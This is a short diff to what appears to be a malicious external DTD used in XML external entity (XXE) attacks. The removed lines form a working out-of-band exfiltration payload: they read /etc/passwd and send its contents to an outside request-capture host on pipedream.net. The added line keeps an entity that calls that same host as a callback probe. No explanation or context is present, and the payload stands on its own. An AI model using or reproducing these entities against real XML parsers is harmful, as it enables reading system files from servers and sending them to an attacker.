@@ -1,3 +1,1 @@
-<!ENTITY % passwd SYSTEM "file:///etc/passwd">
-<!ENTITY % wrapper "<!ENTITY send SYSTEM 'https://end7l0yp0boy.x.pipedream.net/?%passwd;'>">
-%wrapper;
+<!ENTITY % paramEntity "<!ENTITY genEntity SYSTEM 'https://end7l0yp0boy.x.pipedream.net/'>">
